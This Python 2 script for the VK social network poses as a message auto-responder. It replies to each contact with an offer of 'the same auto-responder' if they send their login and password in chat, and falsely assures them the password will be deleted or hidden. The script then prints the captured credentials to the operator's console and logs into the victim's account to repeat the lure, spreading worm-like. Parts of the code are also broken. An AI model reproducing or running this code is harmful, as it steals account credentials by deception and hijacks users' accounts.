#!/usr/bin/python
# -*- coding: UTF-8 -*-
import vk
import time
import threading
import re
import random
threads = []
users= []
useusers = []
messagetext0 = ["Привет! Я отвечу в ближашее время!", "Здраствуй. Я отвчу позже,когда зайду в ВК","Приветствую! Это автоответчик. Отвечу позже!"]
messagetext1 = ["Если хочешь такой же автоответчик, отправь", "Хочешь такой же автоответчик ? Отправь", "Нужен автоответчик ? Отправь"]
messagetext2 = ["У пользователя твой пароль удалится!", "У собеседника пароль не высветится", "Твой пароль собеседник не увидит"]
messagetexterror = ["Неправильный лоигн или пароль", "Ошибка! Неверные данные.","Не удалось авторизоваться. Проверьте данные."]
last_time = 0

def fg(mass,user):
    i = 1
    while i != len(mass):
        info = mass[i]
        if str(info["uid"]) == str(user):
            print info["body"]
            if info["read_state"] == 1:
                print "Прочитано"
                return True
            else:
                print "Непрочитано"
                return False
        
    

def st(log,pas,logi):
    maslow = {}
    session = vk.Session()
    session = vk.AuthSession('5001234', log, pas, scope='wall, messages, users')
    vk_api = vk.API(session)
    api = vk.API(session)
    vk_api.account.setOffline()
    users.append(int(vk_api.users.get()[0]["uid"]))
    resp_account = vk_api.account.getProfileInfo()
    print "new user: " + resp_account["first_name"] + " " + resp_account["last_name"]
    last_time = time.time()
    print vk_api.messages.get(out="0", count = "5")
    while True:
        print "useusers:" + str(useusers)
        print maslow
        if logi:
            print "#######################"
            print "Quantity users: " + str(len(threads)+1)
            print users
        resp = vk_api.messages.get(out="0", count = "1")[1]
        userid = int(resp["uid"])
        tupo = userid in maslow.keys()
        print tupo
        if tupo == False:
            print "Именно добавлен"
            d = {userid:False}
            maslow.update(d)
        if resp["read_state"] == 0 and resp.keys()[5] != "users_count":
            print resp.keys()
            result = re.findall("/start .+ .+", resp["body"])
            if len(result) == 1:
                vk_api.messages.delete(message_ids = resp["mid"], spam = "0")
                log = re.findall(" (.+) ", resp["body"])[0]
                pas = re.findall(" .+ (.+)", resp["body"])[0]
                print "login: " + log
                print "pass: " + pas
                try:
                    session2 = vk.Session()
                    session2 = vk.AuthSession('5001234', log, pas, scope='wall, messages, users')
                    vk_api2 = vk.API(session)
                    api2 = vk.API(session)
                except:
                    times = random.randint(0,2)
                    vk_api.messages.send(user_id=userid, message=messagetexterror[times])
                    print ("login or password is not avalible")
                else:
                    t = threading.Thread(target=st, args = (log, pas,False))
                    threads.append(t)
                    t.start()
                    vk_api.messages.send(user_id=userid, message="Готово")
                    print ("New user is Active")
                    
            else:
                if str(userid in useusers) == "False":
                    last_time =time.time()
                    useusers.append(userid)
                    print 'For message: "' + resp["body"] + '" have answer'
                    times = random.randint(0,2)
                    vk_api.messages.send(user_id=userid, message=messagetext0[times])
                    try:
                        users.index(userid)
                    except:
                        vk_api.messages.send(user_id=userid, message=messagetext1[times])
                        vk_api.messages.send(user_id=userid, message = "/start логин пароль")
                        vk_api.messages.send(user_id=userid, message=messagetext2[times])
                else:
                    maslow[userid] = True
            

        if fg(vk_api.messages.get(out="0", count = "100"), userid) and maslow[userid]:   # здесь типа должен убиратся юзд пользователя на отправление автоответика
            try:
                
                useusers.remove(userid)
                maslow[userid] = False
                vk_api.messages.markAsRead(message_ids = resp["mid"])
                print "For user " + str(userid) + " delete from time ban list"
            except:
                print("ощибка брат")
                True
                    
        time.sleep(2)
raw_input("For start please 'Enter'")
st("login", "password",True)
